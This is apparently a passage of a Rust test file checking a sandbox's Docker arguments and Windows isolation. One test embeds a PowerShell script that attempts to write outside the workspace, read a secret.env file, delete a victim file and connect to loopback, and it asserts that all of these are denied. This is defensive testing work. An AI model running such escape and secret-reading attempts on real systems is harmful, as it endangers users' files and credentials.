    denied(sandbox::docker_invocation(&c, &["info"], Path::new("/x")), "changed");
    let limits = contract(&policy_value()).unwrap().limits;
    let write = vec!["src/".to_string()];
    let spec = Spec { image: "sha256:x", snapshot: &t.0, control: &t.0, writable: &write, limits: &limits, entry: vec!["__runner".into()], network: "none", volumes: vec![], root: false, home_mb: 0 };
    let a = sandbox::container_args(&spec, "kern-x").unwrap().join(" ");
    for want in ["--runtime=runsc", "--network=none", "--read-only", "--user=1000:1000", "--cap-drop=ALL", "no-new-privileges", "--pull=never", "--entrypoint=/kern/kern"] { assert!(a.contains(want), "{want}"); }
    assert!(!a.contains("docker.sock") && a.matches("type=bind").count() == 3 && a.matches(",readonly").count() == 3);
    denied(sandbox::container_args(&Spec { network: "bridge", ..spec }, "kern-x"), "Only dependency setup");
}

#[cfg(windows)]
fn win(p: &Path) -> String { p.display().to_string() }
#[cfg(windows)]
#[test]
fn windows_box_blocks_escape_reads_writes_and_local_network() {
    let t = Temp::new();
    let ws = t.join("ws");
    std::fs::create_dir_all(&ws).unwrap();
    let outside = t.join("outside");
    std::fs::create_dir_all(&outside).unwrap();
    let victim = outside.join("victim.txt");
    std::fs::write(&victim, "keep").unwrap();
    let secret = outside.join("secret.env");
    std::fs::write(&secret, "TOPSECRET=42").unwrap();

    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let port = listener.local_addr().unwrap().port();
    std::thread::spawn(move || { for s in listener.incoming() { drop(s); } });
    let control_reached = std::net::TcpStream::connect(("127.0.0.1", port)).is_ok();

    let rep = win(&ws.join("report.txt"));
    let tpl = "$r='REP'; \
        try{Set-Content -LiteralPath 'INS' -Value ok -ErrorAction Stop; Add-Content $r 'A inside ALLOWED'}catch{Add-Content $r 'A inside DENIED'}; \
        try{Set-Content -LiteralPath 'VIC' -Value pwned -ErrorAction Stop; Add-Content $r 'B write-outside ALLOWED'}catch{Add-Content $r 'B write-outside DENIED'}; \
        try{$c=[IO.File]::ReadAllText('SEC'); Add-Content $r ('D read-secret ALLOWED '+$c)}catch{Add-Content $r 'D read-secret DENIED'}; \
        try{Remove-Item -LiteralPath 'VIC' -ErrorAction Stop; Add-Content $r 'C delete-outside ALLOWED'}catch{Add-Content $r 'C delete-outside DENIED'}; \
        try{$t=New-Object Net.Sockets.TcpClient; $i=$t.BeginConnect('127.0.0.1',PORT,$null,$null); if($i.AsyncWaitHandle.WaitOne(1500) -and $t.Connected){Add-Content $r 'F loopback ALLOWED'}else{Add-Content $r 'F loopback DENIED'}; $t.Close()}catch{Add-Content $r 'F loopback DENIED'}";
    let script = tpl
        .replace("REP", &rep)
        .replace("INS", &win(&ws.join("inside.txt")))
        .replace("VIC", &win(&victim))
        .replace("SEC", &win(&secret))
        .replace("PORT", &port.to_string());
    let ps = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
    let job = json!({ "version": 1, "workspace": win(&ws), "tools": [], "denied": [], "network": false,
        "command": [ps, "-NoProfile", "-NonInteractive", "-Command", script] });
    let parsed = kern::local::box_job(&job).unwrap();
    let result = kern::local::run_box_job(&parsed).unwrap();
    assert_eq!(result["status"], "OK", "{result}");

    let report = std::fs::read_to_string(ws.join("report.txt")).expect("boxed process wrote report inside workspace");
    assert!(report.contains("A inside ALLOWED"), "{report}");
    assert!(report.contains("B write-outside DENIED"), "{report}");
    assert!(report.contains("C delete-outside DENIED"), "{report}");
    assert!(report.contains("D read-secret DENIED"), "{report}");
    assert!(report.contains("F loopback DENIED"), "{report}");
    assert_eq!(std::fs::read_to_string(&victim).unwrap(), "keep", "box must not have modified the outside victim file");
    assert!(control_reached, "independent control: the test process itself must reach the loopback listener the box was denied");
}
